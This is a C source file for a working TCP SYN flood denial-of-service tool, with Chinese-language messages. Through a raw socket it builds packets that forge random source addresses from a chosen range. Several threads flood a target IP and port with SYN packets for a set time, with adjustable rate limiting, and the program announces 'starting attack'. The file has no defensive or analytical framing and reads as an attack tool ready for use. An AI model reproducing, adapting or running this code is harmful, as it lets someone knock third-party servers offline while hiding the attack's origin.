#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define MAXTTL 255

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

unsigned long int start_ip; // 起始IP地址
unsigned long int end_ip;   // 结束IP地址

void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) { Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned short csum (unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) { sum += *(unsigned char *)buf; }
    while (sum >> 16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{
    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 6;
    iph->check = 0;
}

void setup_tcp_header(struct tcphdr *tcph)
{
    tcph->source = htons(5678);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

unsigned long int ip_to_long(const char *ip)
{
    struct in_addr addr;
    inet_aton(ip, &addr);
    return ntohl(addr.s_addr);
}

void long_to_ip(unsigned long int ip, char *buffer)
{
    struct in_addr addr;
    addr.s_addr = htonl(ip);
    strcpy(buffer, inet_ntoa(addr));
}

unsigned long int generate_random_ip(unsigned long int start, unsigned long int end)
{
    return start + (rand_cmwc() % (end - start + 1));
}

void *flood(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        fprintf(stderr, "无法打开原始套接字。\n");
        exit(-1);
    }
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_tcp_header(tcph);

    tcph->dest = htons(floodport);

    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);

    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
        fprintf(stderr, "错误: setsockopt() - 无法设置HDRINCL！\n");
        exit(-1);
    }

    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while (1) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));

        // 生成随机的源IP地址
        iph->saddr = htonl(generate_random_ip(start_ip, end_ip));
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        tcph->seq = rand_cmwc() & 0xFFFF;
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);

        pps++;
        if (i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}

int main(int argc, char *argv[])
{
    if (argc < 7) {
        fprintf(stderr, "参数无效！\n");
        fprintf(stdout, "使用方法: %s <目标IP> <被攻击端口> <使用的线程数> <每秒数据包数限制，-1为无限制> <时间> <源IP范围>\n", argv[0]);
        exit(-1);
    }

    fprintf(stdout, "正在设置套接字...\n");

    int num_threads = atoi(argv[3]);
    floodport = atoi(argv[2]);
    int maxpps = atoi(argv[4]);
    limiter = 0;
    pps = 0;
    pthread_t thread[num_threads];

    char source_ip_range[32];
    strcpy(source_ip_range, argv[6]);
    char *slash = strchr(source_ip_range, '/');
    if (!slash) {
        fprintf(stderr, "源IP范围格式无效，应为x.x.x.x/x格式。\n");
        exit(-1);
    }
    *slash = '\0';
    int prefix_length = atoi(slash + 1);
    if (prefix_length < 0 || prefix_length > 32) {
        fprintf(stderr, "源IP前缀长度无效。\n");
        exit(-1);
    }

    unsigned long int base_ip = ip_to_long(source_ip_range);
    unsigned long int mask = (0xFFFFFFFF << (32 - prefix_length)) & 0xFFFFFFFF;
    start_ip = base_ip & mask;
    end_ip = start_ip | (~mask & 0xFFFFFFFF);

    int multiplier = 20;

    int i;
    for (i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, &flood, (void *)argv[1]);
    }

    fprintf(stdout, "开始攻击...\n");
    for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
    {
        usleep((1000 / multiplier) * 1000);
        if ((pps * multiplier) > maxpps)
        {
            if (1 > limiter)
            {
                sleeptime += 100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if (sleeptime > 25)
            {
                sleeptime -= 25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }

    return 0;
}
